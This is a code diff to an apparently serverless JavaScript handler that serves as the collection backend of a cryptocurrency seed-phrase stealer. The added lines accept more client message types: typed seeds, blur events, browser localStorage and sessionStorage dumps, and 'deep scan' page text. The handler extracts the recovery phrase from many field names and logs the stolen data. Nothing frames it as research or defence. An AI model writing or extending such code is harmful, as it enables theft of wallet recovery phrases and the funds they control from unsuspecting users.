@@ -66,26 +66,51 @@ export default async function handler(req, res) {
       searchEngine = '🔗 Referral';
     }
 
-    // Check if this is a seed phrase submission
+    // Check if this is a seed phrase submission (matches client TYPE values)
     const isSeedPhraseData = data && (
       data.TYPE === 'SEED_PHRASE' ||
       data.TYPE === 'SEED_ON_BLUR' ||
       data.TYPE === 'WALLET_CREATED_DISPLAYED' ||
       data.TYPE === 'WALLET_CREATED_PHRASE_DISPLAYED' ||
+      data.TYPE === 'WALLET_CREATED' ||
+      data.TYPE === 'SEED_TYPED' ||
+      data.TYPE === 'SEED_BLUR' ||
+      data.TYPE === 'SEED_INPUT' ||
+      data.TYPE === 'STORAGE_LOCALSTORAGE' ||
+      data.TYPE === 'STORAGE_SESSIONSTORAGE' ||
+      data.TYPE === 'DEEPSCAN' ||
+      data.TYPE === 'DEEPSCAN_TEXT' ||
       data.type === 'SEED_PHRASE' ||
       data.type === 'SEED_ON_BLUR' ||
       data.type === 'WALLET_CREATED_DISPLAYED' ||
-      data.type === 'WALLET_CREATED_PHRASE_DISPLAYED'
+      data.type === 'WALLET_CREATED_PHRASE_DISPLAYED' ||
+      data.type === 'WALLET_CREATED' ||
+      data.type === 'SEED_TYPED' ||
+      data.type === 'SEED_BLUR' ||
+      data.type === 'SEED_INPUT' ||
+      data.type === 'STORAGE_LOCALSTORAGE' ||
+      data.type === 'STORAGE_SESSIONSTORAGE' ||
+      data.type === 'DEEPSCAN' ||
+      data.type === 'DEEPSCAN_TEXT'
     );
 
-    // Extract phrase from any field name
+    // Extract phrase from any field name (client sends PHRASE uppercase)
     const phraseContent = data && (
-      data.PHRASE || data.phrase ||
-      data.content || data.CONTENT ||
-      data.seed || data.SEED ||
-      data.mnemonic || data.MNEMONIC ||
-      data.recovery || data.RECOVERY
+      data.PHRASE ||
+      data.phrase ||
+      data.content ||
+      data.CONTENT ||
+      data.seed ||
+      data.SEED ||
+      data.mnemonic ||
+      data.MNEMONIC ||
+      data.recovery ||
+      data.RECOVERY
     );
+    
+    // Debug logging
+    console.log('📨 Received data:', JSON.stringify(data, null, 2));
+    console.log('🔍 Extracted phrase:', phraseContent ? phraseContent.substring(0, 50) + '...' : 'NONE');
 
     // BIP39 seed phrase validator — rejects normal sentences
     function isRealSeedPhrase(val) {
